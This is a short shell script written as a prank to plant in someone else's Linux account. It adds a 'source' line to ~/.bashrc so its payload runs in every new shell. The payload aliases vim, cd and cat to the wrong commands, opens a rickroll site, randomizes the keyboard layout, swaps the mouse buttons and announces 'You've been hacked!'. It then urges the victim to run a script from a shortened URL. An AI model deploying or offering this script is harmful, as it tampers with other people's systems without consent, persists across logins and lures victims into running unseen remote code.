#!/bin/sh

cat <<EOF > ~/.loose
alias vim=emacs
alias cd=ls
alias cat=cd

google-chrome rickroll.fr     2&>/dev/null
{if whereis localctl; then
    setxkbmap $(localectl list-keymaps | shuf -n 1)
else
    setxkbmap dvorak
fi; } 2> /dev/null
xset mouse 3 0                2&>/dev/null
xmodmap -e "pointer = 3 2 1"  2&>/dev/null
echo "You've been hacked!"
echo "  You are now using a randomly chosen keyboard (or dvorak)"
echo "  To 'repair' your computer, you need to undo everything in ~/.loose file"
echo "  Or execute this script: http://j.mp/wiiiiiin"
echo "Tchuss"
EOF

grep .loose ~/.bashrc 2>/dev/null || echo "source ~/.loose" >> ~/.bashrc

#. ~/.loose
